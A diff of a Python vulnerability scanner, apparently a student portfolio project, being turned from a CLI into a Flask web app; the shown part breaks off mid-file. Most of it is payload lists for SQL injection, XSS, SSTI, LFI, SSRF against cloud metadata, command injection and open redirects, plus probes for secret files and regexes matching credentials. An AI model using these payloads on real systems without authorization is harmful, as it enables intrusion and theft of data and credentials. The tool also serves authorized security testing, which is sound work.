@@ -1,2180 +1,1414 @@
 #!/usr/bin/env python3
 """
-██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
-██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
-██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
-██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
-██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
-
-PHANTOM v2.0 — Persistent Heuristic Attack & Network Threat Observation Machine
-IIT Kanpur B.Cyber Portfolio Project | Authorized Testing Only
+PHANTOM v2.0 — Web Interface
+Flask web app for Render.com deployment
+Advanced Autonomous Vulnerability Scanner
 """
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  IMPORTS
-# ══════════════════════════════════════════════════════════════════════════════
-import asyncio, base64, json, re, socket, ssl, sys, threading, time, argparse
+import asyncio, base64, json, os, re, socket, ssl, sys
+import threading, time, uuid, warnings
 from collections import deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from datetime import datetime
-from typing import Any, Optional
+from typing import Optional
 from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, quote
 
 import requests
 from bs4 import BeautifulSoup
-from rich import box
-from rich.align import Align
-from rich.console import Console
-from rich.layout import Layout
-from rich.live import Live
-from rich.panel import Panel
-from rich.progress import (BarColumn, Progress, SpinnerColumn,
-                           TaskProgressColumn, TextColumn, TimeElapsedColumn)
-from rich.rule import Rule
-from rich.syntax import Syntax
-from rich.table import Table
-from rich.text import Text
-from rich.tree import Tree
+from flask import Flask, request, jsonify
 
-try:
-    import dns.resolver, dns.query, dns.zone
-    DNS_AVAILABLE = True
-except ImportError:
-    DNS_AVAILABLE = False
+warnings.filterwarnings("ignore")
+try: requests.packages.urllib3.disable_warnings()
+except: pass
+try:    import dns.resolver, dns.query, dns.zone; DNS_AVAILABLE = True
+except: DNS_AVAILABLE = False
+try:    import whois as wh; WHOIS_AVAILABLE = True
+except: WHOIS_AVAILABLE = False
 
-try:
-    import whois as whois_lib
-    WHOIS_AVAILABLE = True
-except ImportError:
-    WHOIS_AVAILABLE = False
-
-try:
-    requests.packages.urllib3.disable_warnings()
-except Exception:
-    pass
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  CONFIGURATION
-# ══════════════════════════════════════════════════════════════════════════════
-MAX_THREADS     = 20
-PORT_TIMEOUT    = 1.0
-REQUEST_TIMEOUT = 10
+# ── Config ────────────────────────────────────────────────────────────────────
+PORT            = int(os.environ.get("PORT", 5000))
+MAX_THREADS     = 15
+REQUEST_TIMEOUT = 8
 CRAWL_DEPTH     = 3
-MAX_URLS        = 200
-REQUEST_DELAY   = 0.1
-SCANNER_VERSION = "2.0"
+MAX_URLS        = 150
+REQUEST_DELAY   = 0.10
+SCAN_VERSION    = "2.0"
+
+app   = Flask(__name__)
+scans = {}
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
-    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-    "(KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) "
-    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
 ]
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  CONSTANTS — PAYLOADS & PATTERNS
-# ══════════════════════════════════════════════════════════════════════════════
-
-# ── SQL Injection ─────────────────────────────────────────────────────────────
+# ── Payloads ──────────────────────────────────────────────────────────────────
 SQL_PAYLOADS = [
-    # Error-based
-    "'", '"', "''", "\\", "\\\\",
-    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
-    "\" OR \"1\"=\"1", "\" OR 1=1--",
-    "admin'--", "admin'#", "') OR ('1'='1",
-    # Union-based
-    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT 1,2,3--",
-    "1' UNION SELECT version(),NULL--",
-    "1' UNION SELECT database(),NULL--",
-    # Order-by column enum
-    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
-    "1' ORDER BY 100--+",
-    # Boolean-blind
-    "1 AND 1=1", "1 AND 1=2",
-    "' AND '1'='1", "' AND '1'='2",
-    "1' AND 1=1--", "1' AND 1=2--",
-    # Time-blind
-    "' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
-    "'; SELECT pg_sleep(3)--",
-    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
-    # Error-based extraction
+    "'","\"","''","\\'",
+    "' OR '1'='1","' OR 1=1--","' OR 1=1#",
+    "\" OR 1=1--","admin'--","admin'#","') OR ('1'='1",
+    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
+    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
+    "1 AND 1=1","1 AND 1=2","' AND '1'='1","' AND '1'='2",
+    "' AND SLEEP(3)--","1; WAITFOR DELAY '0:0:3'--","'; SELECT pg_sleep(3)--",
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
-    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),"
-    "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-    # Stacked
-    "'; DROP TABLE users--", "'; SELECT SLEEP(3)--",
-    # Encoded
-    "%27", "1%27 OR 1=1", "%27 OR %271%27=%271",
-    # Oracle
-    "' OR 1=1--", "' OR '1'='1' --",
-    # Special
-    "' GROUP BY columnnames having 1=1--",
-    "' HAVING 1=1--",
+    "%27","1%27 OR 1=1",
 ]
-
-SQL_ERROR_PATTERNS = [
-    r"sql syntax.*mysql", r"warning.*mysql_",
-    r"you have an error in your sql syntax",
+SQL_ERRORS = [
+    r"sql syntax.*mysql",r"warning.*mysql_",r"you have an error in your sql syntax",
     r"check the manual that corresponds to your (mysql|mariadb)",
-    r"unclosed quotation mark after the character string",
-    r"quoted string not properly terminated",
-    r"microsoft ole db provider for (odbc|sql)",
-    r"pg_exec\(\)", r"pg_query\(",
-    r"ora-\d{5}", r"oracle error",
-    r"sqlite_.*error", r"error.*sqlite",
-    r"sql server.*driver", r"\[sql server\]", r"mssql_query\(",
-    r"syntax error.*in query expression",
-    r"data type mismatch in criteria expression",
-    r"invalid column name", r"unknown column",
-    r"right syntax to use near", r"column count doesn",
-    r"warning.*sybase", r"db2 sql error",
-    r"conversion failed when converting",
+    r"unclosed quotation mark",r"quoted string not properly terminated",
+    r"microsoft ole db provider",r"pg_exec\(",r"pg_query\(",
+    r"ora-\d{5}",r"oracle error",r"sqlite_.*error",r"error.*sqlite",
+    r"sql server.*driver",r"mssql_query\(",r"syntax error.*in query expression",
+    r"data type mismatch in criteria",r"invalid column name",r"unknown column",
+    r"right syntax to use near",r"column count doesn",r"supplied argument is not a valid",
 ]
-
-# ── XSS ───────────────────────────────────────────────────────────────────────
 XSS_PAYLOADS = [
-    # Basic
-    '<script>alert("PHANTOM-XSS")</script>',
-    '<script>alert(1)</script>',
-    '"><script>alert(1)</script>',
-    "'><script>alert(1)</script>",
-    '"><script>alert(document.domain)</script>',
-    # Event handlers
-    '<img src=x onerror=alert(1)>',
-    '"><img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<svg/onload=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-    '<input autofocus onfocus=alert(1)>',
-    '<marquee onstart=alert(1)>',
-    # Attribute injection
-    '" onmouseover="alert(1)',
-    "' onmouseover='alert(1)",
-    # JS context
-    "';alert(1)//", '";alert(1)//',
-    # iframe / URI
-    '<iframe src=javascript:alert(1)>',
-    'javascript:alert(1)',
-    # Filter bypasses
-    '<ScRiPt>alert(1)</ScRiPt>',
-    '<script>alert`1`</script>',
-    '<%2fscript><script>alert(1)</script>',
-    # CSS
-    '</style><script>alert(1)</script>',
-    # SSTI markers (Server-Side Template Injection)
-    '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
-    '{{config}}', '{{self.__class__.__mro__}}',
+    '<script>alert(1)</script>','"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
+    '"><img src=x onerror=alert(1)>','<svg onload=alert(1)>','<svg/onload=alert(1)>',
+    '<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>',
+    '{{7*7}}','${7*7}','#{7*7}',
 ]
-
-# ── LFI ───────────────────────────────────────────────────────────────────────
 LFI_PAYLOADS = [
-    # Linux
-    "../../../../etc/passwd",
-    "../../../etc/passwd",
-    "../../etc/passwd",
-    "../etc/passwd",
-    "../../../../etc/passwd%00",
-    "....//....//....//etc/passwd",
-    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "../../../../etc/passwd","../../../etc/passwd","../../etc/passwd",
+    "../../../../etc/passwd%00","....//....//....//etc/passwd",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-    # PHP wrappers (detection only, not RCE)
     "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/read=string.rot13/resource=index.php",
-    "php://filter/convert.base64-encode/resource=config.php",
-    # Windows
     "../../../../windows/win.ini",
-    "../../../../windows/system32/drivers/etc/hosts",
-    "..\\..\\..\\..\\windows\\win.ini",
-    # Null byte
-    "../../../../etc/passwd\x00.jpg",
-    # Double encoding
-    "..%252F..%252F..%252Fetc%252Fpasswd",
 ]
-
-LFI_INDICATORS = [
-    "root:x:", "bin:x:", "daemon:x:", "nobody:x:",
-    "[extensions]", "[fonts]", "[mci extensions]",
-    "localhost\t127", "\\\\[boot loader\\\\]",
+LFI_INDICATORS = ["root:x:","bin:x:","daemon:x:","[extensions]","[fonts]"]
+LFI_PARAMS     = ["file","page","path","include","load","template","view","lang","doc","read","open"]
+SSRF_PARAMS    = ["url","path","host","endpoint","redirect","src","fetch","load","proxy","dest","href"]
+SSRF_PAYLOADS  = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/instance",
+    "http://localhost/","http://127.0.0.1/","file:///etc/passwd",
 ]
-
-LFI_FILE_PARAMS = [
-    "file", "page", "path", "include", "load", "template",
-    "view", "lang", "doc", "read", "open", "src", "url",
-    "dir", "folder", "content", "module", "conf",
+CMD_PAYLOADS   = ["; id","| id","` id`","$(id)","; whoami","| whoami","; sleep 3","| sleep 3"]
+CMD_INDICATORS = ["uid=","gid=","groups=","root:","daemon:","bin:","total ","drwxr"]
+REDIRECT_PARAMS = ["redirect","url","next","return","returnTo","goto","target","dest","to","forward"]
+REDIRECT_PAYLOADS = ["//evil-phantom-test.com","https://evil-phantom-test.com","///evil-phantom-test.com"]
+SENSITIVE_FILES = [
+    "/.env","/.env.local","/.env.backup","/.env.prod",
+    "/.git/config","/.git/HEAD",
+    "/config.php","/wp-config.php","/configuration.php",
+    "/config.yml","/config.json","/database.yml","/secrets.yml",
+    "/.htaccess","/.htpasswd","/web.config",
+    "/phpinfo.php","/info.php","/test.php",
+    "/backup.sql","/dump.sql","/db.sql",
+    "/backup.zip","/backup.tar.gz",
+    "/robots.txt","/sitemap.xml",
+    "/xmlrpc.php","/wp-login.php",
+    "/composer.json","/package.json",
+    "/server-status","/server-info",
+    "/swagger.json","/api-docs","/graphql",
+    "/.bash_history","/readme.md","/CHANGELOG.md",
+    "/actuator/health","/actuator/env","/actuator/beans",
 ]
-
-# ── SSRF ──────────────────────────────────────────────────────────────────────
-SSRF_PARAMS = [
-    "url", "path", "host", "endpoint", "redirect", "src",
-    "fetch", "load", "proxy", "forward", "href", "dest",
-    "uri", "link", "site", "target", "callback", "return",
-]
-
-SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",        # AWS IMDSv1
-    "http://169.254.169.254/latest/meta-data/iam/",    # AWS IAM roles
-    "http://metadata.google.internal/computeMetadata/v1/", # GCP
-    "http://169.254.169.254/metadata/instance",        # Azure
-    "http://100.100.100.200/latest/meta-data/",        # Alibaba
-    "http://localhost/",
-    "http://127.0.0.1/",
-    "http://0.0.0.0/",
-    "http://[::1]/",
-    "file:///etc/passwd",
-    "dict://localhost:6379/INFO",
-    "http://localhost:6379/",
-    "http://localhost:27017/",
-    "http://localhost:9200/_cat/indices",
-    "http://localhost:3306/",
-]
-
-# ── Sensitive Files ────────────────────────────────────────────────────────────
-SENSITIVE_PATHS = [
-    "/.env", "/.env.local", "/.env.backup", "/.env.prod",
-    "/.env.dev", "/.env.staging", "/.env.example",
-    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
-    "/.git/index", "/.git/FETCH_HEAD",
-    "/config.php", "/wp-config.php", "/configuration.php",
-    "/config.yml", "/config.yaml", "/config.json",
-    "/database.yml", "/db.php", "/database.php",
-    "/secrets.yml", "/credentials.yml", "/application.yml",
-    "/.htaccess", "/.htpasswd", "/web.config", "/.user.ini",
-    "/phpinfo.php", "/info.php", "/test.php", "/php.php",
-    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
-    "/backup.zip", "/backup.tar.gz", "/site.zip",
-    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
-    "/xmlrpc.php", "/wp-login.php",
-    "/composer.json", "/composer.lock", "/package.json",
-    "/server-status", "/server-info", "/.DS_Store",
-    "/swagger.json", "/openapi.json", "/api-docs",
-    "/graphql", "/graphiql", "/__debug__/",
-    "/actuator/health", "/actuator/env", "/actuator/beans",
-    "/actuator/mappings", "/actuator/info",
-    "/_ah/admin", "/jmx-console", "/admin-console",
-    "/console", "/manager/html",
-    "/.bash_history", "/.ssh/id_rsa",
-    "/readme.md", "/CHANGELOG.md",
-]
-
 ADMIN_PATHS = [
-    "/admin", "/admin/", "/administrator", "/wp-admin",
-    "/phpmyadmin", "/pma/", "/dashboard", "/panel",
-    "/manage", "/backend", "/cms",
-    "/login", "/signin", "/user/login",
-    "/cpanel", "/webmin",
+    "/admin","/admin/","/administrator","/wp-admin",
+    "/phpmyadmin","/pma/","/dashboard","/panel",
+    "/manage","/backend","/cms","/login","/signin",
+    "/user/login","/auth/login","/cpanel",
 ]
-
-# ── Command Injection ─────────────────────────────────────────────────────────
-CMD_PAYLOADS = [
-    "; id",  "| id",  "` id`",  "$(id)",
-    "; whoami", "| whoami",
-    "; cat /etc/passwd",
-    "; sleep 3", "| sleep 3", "` sleep 3`", "$(sleep 3)",
-    "& ping -c 3 127.0.0.1",
-    "; ls -la", "| ls -la",
-    "& dir", "& ipconfig",
-    "; echo PHANTOM_CMD_INJECTION_PROOF",
-]
-
-CMD_INDICATORS = [
-    "uid=", "gid=", "groups=",
-    "root:", "daemon:", "bin:",
-    "total ", "drwxr", "drwx",
-    "PHANTOM_CMD_INJECTION_PROOF",
-    "Volume in drive", "Directory of",
-]
-
-# ── Open Redirect ─────────────────────────────────────────────────────────────
-REDIRECT_PARAMS = [
-    "redirect", "url", "next", "return", "returnTo",
-    "return_url", "redirect_url", "goto", "target",
-    "redir", "destination", "dest", "to", "link",
-    "forward", "continue", "callback", "back",
-]
-
-REDIRECT_PAYLOADS = [
-    "//evil-phantom-test.com",
-    "https://evil-phantom-test.com",
-    "///evil-phantom-test.com",
-    "/\\/evil-phantom-test.com",
-    "https:evil-phantom-test.com",
-    "javascript:alert(1)",
-    "//google.com",
-]
-
-# ── API Key Patterns ──────────────────────────────────────────────────────────
-API_KEY_PATTERNS = {
-    "AWS Access Key":    r"AKIA[0-9A-Z]{16}",
-    "AWS Secret Key":    r"(?i)aws.*secret.*=.*[0-9a-zA-Z/+]{40}",
-    "Google API Key":    r"AIza[0-9A-Za-z\-_]{35}",
-    "GitHub Token":      r"ghp_[a-zA-Z0-9]{36}",
-    "GitHub OAuth":      r"gho_[a-zA-Z0-9]{36}",
-    "Stripe Live Key":   r"sk_live_[0-9a-zA-Z]{24}",
-    "Stripe Test Key":   r"sk_test_[0-9a-zA-Z]{24}",
-    "Slack Token":       r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
-    "SendGrid Key":      r"SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}",
-    "Twilio SID":        r"SK[0-9a-fA-F]{32}",
-    "JWT Token":         r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*",
-    "Private RSA Key":   r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
-    "Generic Secret":    r"(?i)(password|secret|token|api_key|apikey|passwd)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
-    "DB Password":       r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
-}
-
-# ── Security Headers ──────────────────────────────────────────────────────────
 SECURITY_HEADERS = {
-    "X-Frame-Options":              ("HIGH",   "Prevents Clickjacking", "DENY or SAMEORIGIN"),
-    "X-XSS-Protection":             ("MEDIUM", "Browser XSS filter",    "1; mode=block"),
-    "X-Content-Type-Options":       ("MEDIUM", "MIME sniffing block",   "nosniff"),
-    "Strict-Transport-Security":    ("HIGH",   "Forces HTTPS (HSTS)",   "max-age=31536000; includeSubDomains"),
-    "Content-Security-Policy":      ("HIGH",   "XSS / injection policy","default-src 'self'"),
-    "Referrer-Policy":              ("LOW",    "Referrer control",      "strict-origin-when-cross-origin"),
-    "Permissions-Policy":           ("LOW",    "Browser feature control","geolocation=(), microphone=()"),
-    "Expect-CT":                    ("LOW",    "Cert transparency",     "max-age=86400, enforce"),
-    "Cross-Origin-Opener-Policy":   ("MEDIUM", "Cross-origin isolation","same-origin"),
-    "Cross-Origin-Embedder-Policy": ("MEDIUM", "Embedding restriction", "require-corp"),
-    "Cross-Origin-Resource-Policy": ("MEDIUM", "Resource access ctrl",  "same-origin"),
+    "X-Frame-Options":           {"desc":"Clickjacking protection","risk":"HIGH",  "rec":"DENY"},
+    "X-XSS-Protection":          {"desc":"Browser XSS filter",    "risk":"MEDIUM","rec":"1; mode=block"},
+    "X-Content-Type-Options":    {"desc":"MIME sniffing block",    "risk":"MEDIUM","rec":"nosniff"},
+    "Strict-Transport-Security": {"desc":"Forces HTTPS (HSTS)",    "risk":"HIGH",  "rec":"max-age=31536000; includeSubDomains"},
+    "Content-Security-Policy":   {"desc":"XSS/injection policy",  "risk":"HIGH",  "rec":"default-src 'self'"},
+    "Referrer-Policy":           {"desc":"Referrer control",       "risk":"LOW",   "rec":"strict-origin-when-cross-origin"},
+    "Permissions-Policy":        {"desc":"Browser feature control","risk":"LOW",   "rec":"geolocation=(), microphone=()"},
+    "Cross-Origin-Opener-Policy":{"desc":"Cross-origin isolation", "risk":"MEDIUM","rec":"same-origin"},
+}
+API_KEY_PATTERNS = {
+    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
+    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
+    "GitHub Token":    r"ghp_[a-zA-Z0-9]{36}",
+    "Stripe Key":      r"sk_live_[0-9a-zA-Z]{24}",
+    "Slack Token":     r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
+    "JWT Token":       r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*",
+    "Private Key":     r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
+    "DB Password":     r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
+    "Generic Secret":  r"(?i)(password|secret|api_key)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
+}
+VULN_IMPACT = {
+    "SQL Injection":         ("CRITICAL",9.8,"Full database compromise — read/modify/delete all data, potential RCE via INTO OUTFILE"),
+    "SQL Injection (Form)":  ("CRITICAL",9.8,"Full database compromise via form input field"),
+    "Data Extraction":       ("CRITICAL",9.8,"Database version/schema extracted — SQLi fully exploitable"),
+    "SSTI":                  ("CRITICAL",9.0,"Server-Side Template Injection — Remote Code Execution possible"),
+    "LFI":                   ("CRITICAL",7.5,"Local File Inclusion — read server files, chain to RCE via log poisoning"),
+    "LFI Config Read":       ("CRITICAL",9.0,"Config file read via php://filter — credentials exposed"),
+    "Command Injection":     ("CRITICAL",9.8,"OS command execution as web server user — full system compromise"),
+    "Unauthenticated Redis": ("CRITICAL",9.8,"Redis accessible without auth — all cached data readable/writable"),
+    "SSRF":                  ("HIGH",    8.6,"Server-Side Request Forgery — access cloud metadata, internal services"),
+    "Reflected XSS":         ("HIGH",    6.1,"Session hijacking, credential theft, defacement via script injection"),
+    "Reflected XSS (Form)":  ("HIGH",    6.1,"XSS via form input — attacker can steal sessions"),
+    "CORS Misconfiguration": ("HIGH",    8.1,"Cross-origin API access — attacker site makes auth requests as victim"),
+    "Sensitive File Exposed":("HIGH",    7.5,"Credentials, source code, or config data publicly accessible"),
+    "Admin Panel Found":     ("HIGH",    7.0,"Admin interface exposed — brute-force or credential stuffing risk"),
+    "FTP Anonymous Login":   ("HIGH",    7.5,"Unauthenticated file access — source code or backup exposure"),
+    "Unauthenticated Elasticsearch":("HIGH",7.5,"All search indices accessible without credentials"),
+    "Unauthenticated MongoDB":("HIGH",   7.5,"Database accessible without authentication"),
+    "DNS Zone Transfer":     ("HIGH",    7.5,"All subdomains enumerated — full attack surface mapped"),
+    "Outdated Service CVE":  ("HIGH",    7.5,"Known exploitable vulnerability in detected service version"),
+    "Clickjacking":          ("MEDIUM",  6.5,"UI redressing — trick users into clicking hidden buttons"),
+    "CSRF Missing Token":    ("MEDIUM",  6.5,"Forged requests on behalf of authenticated users"),
+    "Open Redirect":         ("MEDIUM",  6.1,"Phishing via trusted domain, OAuth token theft"),
+    "Insecure Cookie":       ("MEDIUM",  5.3,"Session token theft over HTTP, XSS, or CSRF"),
+    "Missing Header (HIGH)": ("MEDIUM",  5.0,"Missing security header enables attack vectors"),
+    "Missing Header (MEDIUM)":("LOW",    3.0,"Missing header reduces defence-in-depth"),
+    "Info Disclosure":       ("LOW",     3.0,"Server/technology version exposed — aids targeted exploits"),
+    "Open Port (Dangerous)": ("HIGH",    7.5,"Dangerous service exposed on public port"),
+    "JWT Issue":             ("MEDIUM",  5.3,"JWT misconfiguration — potential for tampering or alg:none attack"),
+    "API Key Exposed":       ("CRITICAL",9.1,"Credential exposed — direct access to external service"),
+}
+VULN_FIX = {
+    "SQL Injection":        ["Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s',(id,))","Apply input whitelist validation","Enforce least-privilege DB user"],
+    "Reflected XSS":        ["HTML-encode all output: htmlspecialchars($v, ENT_QUOTES,'UTF-8')","Implement strict Content-Security-Policy","Use framework auto-escaping"],
+    "SSTI":                 ["Never pass user input to template.render()","Use Jinja2 SandboxedEnvironment","Whitelist allowed template variables"],
+    "LFI":                  ["Never pass user input to file functions","Whitelist allowed file paths","Disable allow_url_include in php.ini"],
+    "SSRF":                 ["Whitelist allowed outbound domains","Block RFC-1918 IPs at network level","Use IMDSv2 (token-required) on cloud instances"],
+    "CORS Misconfiguration":["Set ACAO to explicit trusted domain list","Never reflect request Origin header blindly","Avoid ACAC:true with wildcard ACAO"],
+    "Sensitive File Exposed":["Move files outside webroot","Block via .htaccess: Deny from all","Add .env to .gitignore"],
+    "Missing Header (HIGH)":["Apache: Header always set X-Frame-Options DENY","Nginx: add_header X-Frame-Options DENY;","Express: use helmet() middleware"],
+    "Insecure Cookie":      ["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"],
+    "Clickjacking":         ["Add: X-Frame-Options: DENY","OR: Content-Security-Policy: frame-ancestors 'none'"],
+    "CSRF Missing Token":   ["Add random CSRF token to all POST forms","Validate token server-side on every state-changing request"],
+    "Open Redirect":        ["Whitelist allowed redirect destinations","Never redirect to user-supplied URLs"],
+    "API Key Exposed":      ["Immediately rotate exposed key in provider console","Use environment variables — never hardcode","Scan with trufflehog before every commit"],
+    "Command Injection":    ["Never pass user input to shell_exec/system/exec","Use subprocess with arg list (shell=False)","Validate input against strict whitelist"],
 }
 
-# ── Ports & Services ──────────────────────────────────────────────────────────
-TOP_1000_PORTS = [
-    21,22,23,25,53,80,110,111,119,135,139,143,194,443,445,
-    465,514,587,631,993,995,1080,1194,1433,1521,1723,1883,
-    2049,2121,2222,2375,2376,3000,3306,3389,3690,4000,4001,
-    4444,4848,5000,5432,5672,5900,5984,6000,6379,6443,7000,
-    7001,7070,7443,8000,8008,8009,8080,8081,8082,8083,8085,
-    8088,8090,8161,8443,8444,8500,8600,8761,8888,9000,9001,
-    9090,9091,9092,9200,9300,9418,9443,10000,11211,15672,
-    16010,27017,28017,50000,50070,61616,
-]
-
-DANGEROUS_SERVICES = {
-    "Telnet":          ("CRITICAL", "Unencrypted auth — sniffable",     "CVE-generic"),
-    "Redis":           ("HIGH",     "No auth by default — data exposed", "CVE-2022-0543"),
-    "Elasticsearch":   ("HIGH",     "Unauthenticated data access",       "CVE-2021-22145"),
-    "MongoDB":         ("HIGH",     "No auth in older versions",          "CVE-2017-14529"),
-    "Memcached":       ("MEDIUM",   "No auth, amplification risk",        "CVE-2018-1000115"),
-    "Jupyter":         ("CRITICAL", "Direct RCE if no password",          "CVE-2021-32797"),
-    "FTP":             ("MEDIUM",   "May allow anon access",              "CVE-generic"),
-    "SMTP":            ("LOW",      "Open relay potential",               "CVE-generic"),
-    "RDP":             ("HIGH",     "BlueKeep / DejaBlue risk",           "CVE-2019-0708"),
-    "SMB":             ("CRITICAL", "EternalBlue / WannaCry risk",        "CVE-2017-0144"),
+TOP_PORTS = [21,22,23,25,53,80,110,143,443,445,1433,3000,3306,3389,
+             4000,5000,5432,5672,5900,6379,8000,8080,8081,8083,8088,
+             8443,8888,9000,9090,9200,9300,10000,11211,27017,50000]
+DANGEROUS_PORTS = {
+    23:"Telnet",6379:"Redis",27017:"MongoDB",9200:"Elasticsearch",
+    11211:"Memcached",8888:"Jupyter",
 }
-
-# ── CVE Version Checks ─────────────────────────────────────────────────────────
-VERSION_CVE_MAP = {
-    "OpenSSH": [
-        (lambda v: v < (7, 4), "CVE-2016-6515 - DoS via auth before key exchange"),
-        (lambda v: v < (8, 5), "CVE-2021-28041 - Double-free in ssh-agent"),
-        (lambda v: v < (9, 6), "CVE-2023-51385 - OS cmd injection via shell metachar"),
-    ],
-    "Apache": [
-        (lambda v: v < (2, 4, 51), "CVE-2021-41773 - Path traversal / RCE"),
-        (lambda v: v < (2, 4, 56), "CVE-2023-25690 - HTTP request splitting"),
-    ],
-    "nginx": [
-        (lambda v: v < (1, 21, 0), "CVE-2021-23017 - 1-byte buffer overwrite"),
-        (lambda v: v < (1, 25, 3), "CVE-2023-44487 - HTTP/2 rapid reset DoS"),
-    ],
-}
-
-# ── Vuln metadata ─────────────────────────────────────────────────────────────
-VULN_META = {
-    "SQL Injection": {
-        "cvss": 9.8, "owasp": "A03:2021", "cwe": "CWE-89",
-        "impact": "Full database compromise. Attacker can read all data, "
-                  "modify records, drop tables, and escalate to OS RCE via INTO OUTFILE.",
-        "fix": [
-            "Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s', (id,))",
-            "Apply input whitelist validation before any DB operation",
-            "Enforce least-privilege DB user (SELECT only where applicable)",
-            "Enable MySQL general_log for audit trail of all queries",
-        ],
-    },
-    "Reflected XSS": {
-        "cvss": 6.1, "owasp": "A03:2021", "cwe": "CWE-79",
-        "impact": "Session hijacking, credential theft, defacement, "
-                  "keylogger injection, phishing overlay on legitimate site.",
-        "fix": [
-            "HTML-encode all output: htmlspecialchars($val, ENT_QUOTES, 'UTF-8')",
-            "Implement strict Content-Security-Policy header",
-            "Use framework-level auto-escaping (Jinja2 autoescaping, React JSX)",
-            "Validate and sanitize all user inputs server-side",
-        ],
-    },
-    "SSTI": {
-        "cvss": 9.0, "owasp": "A03:2021", "cwe": "CWE-94",
-        "impact": "Remote code execution via template engine. Attacker can "
-                  "execute arbitrary OS commands, read files, pivot to other systems.",
-        "fix": [
-            "Never pass raw user input to template.render() functions",
-            "Use sandboxed template environments (Jinja2 SandboxedEnvironment)",
-            "Whitelist allowed template variables strictly",
-        ],
-    },
-    "LFI": {
-        "cvss": 7.5, "owasp": "A01:2021", "cwe": "CWE-22",
-        "impact": "Read sensitive server files (/etc/passwd, config files, "
-                  "private keys). Can chain to RCE via log poisoning.",
-        "fix": [
-            "Never pass user input directly to file system functions",
-            "Use a whitelist of allowed file names/paths",
